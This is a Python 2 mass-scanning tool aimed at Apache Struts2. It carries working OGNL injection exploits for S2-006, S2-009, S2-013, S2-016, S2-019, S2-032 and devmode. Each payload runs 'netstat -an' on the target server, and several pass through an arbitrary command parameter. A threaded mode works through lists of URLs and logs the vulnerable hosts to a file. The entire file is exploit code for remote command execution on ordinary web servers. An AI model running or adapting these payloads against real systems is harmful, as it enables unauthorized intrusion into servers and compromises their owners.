#! /usr/bin/env python
# -*-coding:utf-8-*-

import os
import sys
import Queue
import getopt
import logging
import requests
import threading

logging.basicConfig(
    level=logging.WARNING,
    format="[%(asctime)s] %(message)s"
)


def struts2_006(url):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'netstat -an\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))'''

    try:
        resp = requests.post(url, data=exp, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:
            return "s2-006"
    except:
        return None
    return None


def struts2_009(url):
    exp = '''?class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]'''
    url += exp

    try:
        resp = requests.get(url, timeout=10)
        if "0.0.0.0" in resp.content:
            return "s2-009"
    except:
        return None
    return None


def struts2_013(url):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('netstat -an').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}'''

    try:
        resp = requests.post(url, data=exp, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:
            return "s2-013"
    except:
        return None
    return None


def struts2_016(url):
    exp = '''?redirect:$%7B%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B'netstat','-an'%7D)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader%20(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char%5B50000%5D,%23d.read(%23e),%23matt%3d%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println%20(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D'''
    url += exp

    try:
        resp = requests.get(url, timeout=10)
        if "0.0.0.0" in resp.content:
            return "s2-016"
    except:
        return None
    return None


def struts2_016_multipart_formdata__special(url):
    headers = {
        "Accept-Encoding": "gzip, deflate",
        "Connection": " Keep-Alive",
        "Cookie": "",
        "Content-Type": "multipart/form-data; boundary=------------------------4a606c052a893987",
    }
    exp = '''--------------------------4a606c052a893987\r\nContent-Disposition: form-data; name="method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString&cmd=netstat -ano&pp=\\A&ppp= &encoding=UTF-8"\r\n\r\n-1\r\n--------------------------4a606c052a893987--'''

    try:
        resp = requests.post(url, data=exp, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:
            return "s2-016"
    except:
        return None
    return None


def struts2_019(url):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[10000],#d.read(#e),#resp.println(#e),#resp.close()'''
    url += exp

    try:
        resp = requests.post(url, data=exp, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:
            return "s2-019"
    except:
        return None
    return None


def struts2_032(url):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=netstat%20-an&pp=\\A&ppp=%20&encoding=UTF-8'''
    url += exp

    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:
            return "s2-032"
    except:
        return None
    return None


def struts2_devmode(url):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=netstat -an'''
    url += exp

    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:
            return "s2-devmode"
    except:
        return None
    return None


def struts2_all(url):
    logging.warning("trying %s" % url)

    res = struts2_devmode(url) or struts2_032(url) or struts2_019(url) or struts2_016_multipart_formdata__special(
        url) or struts2_016(url) or struts2_013(url) or struts2_009(url) or struts2_006(url)

    if res:
        with open("vuls.txt", "a") as f:
            f.write("%s is struts2 %s vulnerable!\n" % (url, res))


class BatchThreads(threading.Thread):
    def __init__(self, queue):
        super(BatchThreads, self).__init__()
        self.queue = queue

    def run(self):
        while True:
            if self.queue.empty():
                break
            else:
                try:
                    url = self.queue.get()
                    struts2_all(url)
                except:
                    break


def batch_queue(_file, _queue, _thread_number):
    with open(_file) as f:
        urls = [line.strip() for line in f.readlines()]
    urls = set(filter(lambda url: url and not url.startswith("#"), urls))

    if urls:
        for url in urls:
            queue.put(url)

        if _thread_number > (queue.qsize() / 2):
            _thread_number = (queue.qsize())

        for _ in xrange(_thread_number):
            threads.append(BatchThreads(_queue))

        for t in threads:
            t.start()
        for t in threads:
            t.join()


def usage():
    print '''Usage: python %s [option]

All Struts2 Vulnerable Test

-h         scan a single host
-f         scan from a file
    ''' % os.path.basename(sys.argv[0])


if __name__ == '__main__':
    global threads
    threads = []
    queue = Queue.Queue()
    thread_number = 20

    if not len(sys.argv[1:]):
        exit(usage())

    try:
        opts, args = getopt.getopt(sys.argv[1:], 'u:f:')
    except getopt.GetoptError as err:
        exit(usage())
    else:
        for name, value in opts:
            if name == '-u':
                struts2_all(value)
            if name == '-f':
                batch_queue(value, queue, thread_number)
